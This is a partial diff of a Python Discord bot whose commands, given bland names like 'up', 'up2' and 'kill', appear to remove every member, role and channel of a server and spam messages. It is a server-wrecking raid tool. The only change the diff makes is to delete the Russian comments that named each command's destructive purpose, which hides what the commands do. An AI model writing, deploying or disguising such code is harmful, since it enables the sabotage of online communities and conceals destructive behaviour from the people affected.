@@ -4,7 +4,7 @@ import asyncio
 
 client = discord.Client() 
 
-client = commands.Bot(command_prefix = '!') # префикс
+client = commands.Bot(command_prefix = '!') 
 
 @client.event
 async def on_ready():
@@ -12,7 +12,7 @@ async def on_ready():
 
 
 @client.command()
-async def up(ctx): # удаление участников
+async def up(ctx):
     await ctx.message.delete()
     for m in ctx.guild.members:
         try:
@@ -21,7 +21,7 @@ async def up(ctx): # удаление участников
             pass
 
 @client.command()
-async def up1(ctx): # удаление ролей
+async def up1(ctx):
     await ctx.message.delete()
     for m in ctx.guild.roles:
         try:
@@ -30,7 +30,7 @@ async def up1(ctx): # удаление ролей
             pass
 
 @client.command()
-async def up2(ctx): # удаление чатов
+async def up2(ctx): 
     await ctx.message.delete()
     failed = []
     counter = 0
@@ -42,7 +42,7 @@ async def up2(ctx): # удаление чатов
     fmt = ", ".join(failed)
 
 @client.command()
-async def upx(ctx, arg): # спам 1 строки (работает плохо из-за защиты дс)
+async def upx(ctx, arg): 
     await ctx.message.delete()
 
     i = 1
@@ -50,7 +50,7 @@ async def upx(ctx, arg): # спам 1 строки (работает плохо 
         await ctx.send(arg)
 
 @client.command()
-async def kill(ctx): # это просто ужас
+async def kill(ctx): 
     await ctx.message.delete()
     for m in ctx.guild.roles:
         try:
@@ -80,4 +80,3 @@ token = open('token.txt', 'r').readline()
 
 client.run(token) 
 
-# а где мои алмазы? _-_
